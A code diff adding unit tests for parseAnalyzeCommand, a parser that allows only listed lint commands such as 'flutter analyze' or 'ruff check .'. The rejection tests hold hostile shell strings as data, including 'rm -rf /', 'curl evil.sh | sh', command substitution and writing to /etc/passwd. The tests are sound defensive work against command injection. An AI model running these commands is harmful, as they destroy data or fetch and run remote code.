@@ -1,6 +1,6 @@
 import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
-import { hasAnalyzeErrors } from './analyze.service';
+import { hasAnalyzeErrors, parseAnalyzeCommand } from './analyze.service';
 
 const flutter = 'flutter analyze';
 const dart = 'dart analyze';
@@ -44,5 +44,54 @@ describe('hasAnalyzeErrors (flutter/dart)', () => {
       '2 issues found. (0 errors, 2 warnings).',
     ].join('\n');
     assert.equal(hasAnalyzeErrors(flutter, output), false);
+  });
+});
+
+describe('parseAnalyzeCommand', () => {
+  const ok = (cmd: string) => {
+    const r = parseAnalyzeCommand(cmd);
+    assert.ok(!('error' in r), `expected ${cmd} to parse, got ${JSON.stringify(r)}`);
+    return r as { bin: string; args: string[] };
+  };
+  const rejected = (cmd: string) => {
+    const r = parseAnalyzeCommand(cmd);
+    assert.ok('error' in r, `expected ${cmd} to be rejected`);
+  };
+
+  it('parses the commands the detector actually emits', () => {
+    assert.deepEqual(ok('flutter analyze'), { bin: 'flutter', args: ['analyze'] });
+    assert.deepEqual(ok('npx tsc --noEmit'), { bin: 'npx', args: ['tsc', '--noEmit'] });
+    assert.deepEqual(ok('ruff check .'), { bin: 'ruff', args: ['check', '.'] });
+    assert.deepEqual(ok('pylint src/'), { bin: 'pylint', args: ['src/'] });
+  });
+
+  it('collapses irregular whitespace', () => {
+    assert.deepEqual(ok('  dart   analyze  '), { bin: 'dart', args: ['analyze'] });
+  });
+
+  it('rejects shell metacharacters used for command injection', () => {
+    rejected('flutter analyze; rm -rf ~');
+    rejected('flutter analyze && curl evil.sh | sh');
+    rejected('flutter analyze `whoami`');
+    rejected('flutter analyze $(id)');
+    rejected('flutter analyze > /etc/passwd');
+    rejected('flutter analyze | tee out');
+  });
+
+  it('rejects binaries that are not allow-listed', () => {
+    rejected('curl http://evil');
+    rejected('bash -c "id"');
+    rejected('rm -rf /');
+  });
+
+  it('rejects paths, so context.json cannot point at an arbitrary executable', () => {
+    rejected('./evil.sh');
+    rejected('/usr/bin/curl x');
+    rejected('../../evil');
+  });
+
+  it('rejects empty input', () => {
+    rejected('');
+    rejected('   ');
   });
 });
